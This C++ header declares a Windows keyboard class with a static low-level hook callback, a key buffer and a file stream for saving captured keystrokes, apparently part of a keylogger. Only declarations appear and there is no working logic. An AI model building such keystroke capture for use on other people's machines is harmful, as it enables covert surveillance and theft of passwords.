#pragma once
#ifndef keyboard_h__
#define keyboard_h__

#include <queue>

#include "common.hpp"
#include "l10n.hpp"

class Keyboard
{
public:
    Keyboard();
    virtual ~Keyboard();

    void run();

private:
    static LRESULT CALLBACK processingKeyboard(int nCode, WPARAM wParam, LPARAM lParam);
    static void saveLogic(const DWORD& _symbol);
    static void saveBufferToFile();
    static void addNewKeyToBuffer(const WString& _key);
    static void sendStringToFile(const WString& _string);




private:
    static std::unique_ptr<Localization>   m_l10n;
    static std::queue<WString>             m_buffer;
    static std::wofstream                  m_file;
};

declareSynonymFor(Keyboard);

#endif // keyboard_h__